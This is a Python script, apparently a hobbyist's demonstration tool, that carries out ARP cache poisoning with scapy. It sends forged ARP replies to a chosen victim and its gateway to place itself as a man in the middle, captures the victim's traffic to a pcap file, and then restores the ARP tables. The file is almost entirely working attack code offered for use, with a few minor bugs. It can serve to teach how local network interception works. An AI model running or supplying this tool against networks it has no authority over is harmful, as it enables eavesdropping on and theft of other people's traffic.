"""
* FOR DEMONSTRATIONAL PURPOSES ONLY *
Another simple ArpPoisoner

/* Every computer on a network maintains an ARP cache that stores the most recent
media access control (MAC) addresses matching the IP addresses on the local network. */

This is a simple ARP cache poisoning tool, we will convince a target machine 
that we have become its gateway, and we will also convince the gateway that 
in order to reach the target machine, all traffic have to go through us.

- AERivas
"""
from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

# Helper function..
def get_mac(targetip):
    """
    Returns the provided target IPs MAC address.
    - the Ether function in conjunction with the ARP function 
    - creates a packet using the supplied targetip using 
    - asks network-wide who has <target-ip>
    - the srp function sends/recieves the packet unto layer 2
    - loops through the nework list of ips until a match otherwise None

    Parameter targetip: string containing an IPv4 address ex: 52.348.24.123
    """
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arpois:
    def __init__(self, victim, gateway, interface='enp4s0f3u2u1'):
        """
        [*] CONSTRUCTOR [*]
        - creates an arpois object containing the victim, gateway, information and specifies the interface to use.
        """
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = input('Enter the interface to be used. ex: eth0, enp1 ')
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}: ')
        print(f'Gateway ({gateway}) is at {self.gateway_mac}.')
        print(f'Victim ({victim}) is at {self.victim_mac}.')
        print('-'*30)

    def run(self):
        """
        - sets up two processes. One to poison the ARP cache.
        - and another to sniff that poisoned arp.
        """
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        """
        simple ARP poisoner.
        - sets data up to poison victim and the gateway.
        - first creates a poisoned ARP packet for the victim.
        - second creates a poisoned ARP packet for the gateway.
        - poisons the gateway by sending it to the victims IP address
            but uses the attacker's MAC address.
        - poisons the victim by sending the gateways IP address
            but the attacker's  MAC address.


        [!] this program loops all of the above until the user cancels. [!]
        [*] to stop loop CTRL-C [*]
        """
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac
        print(f'IP src: {poison_victim.psrc}')
        print(f'IP dst: {poison_victim.pdst}')
        print(f'MAC dst: {poison_victim.hwdst}')
        print(f'MAC src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=2000):
        """
        simple packet sniffer

        - program sleeps for 5 giving the [poisoning thread] time to set its self up
        - it sniffs a number of packets in this case the parameter count (default: 100)
        - filters the packets that have the victims IP.
        - writes captured packets to a file named arper.pcap
        - before terminating its self, restores the ARP tables back to their defaults.

        Parameter count: int
        """
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the Packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        """
        restore ARP tables back to its defaults.

        - will be called upon user termination ex. [CTRL-C]
        - will be called when the specified amount of packets have been captured.
        - sets back both victim and gateway  IP and MAC addresses back to default
        """
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gateway_mac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victim_mac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arpois(victim, gateway, interface)
    myarp.run()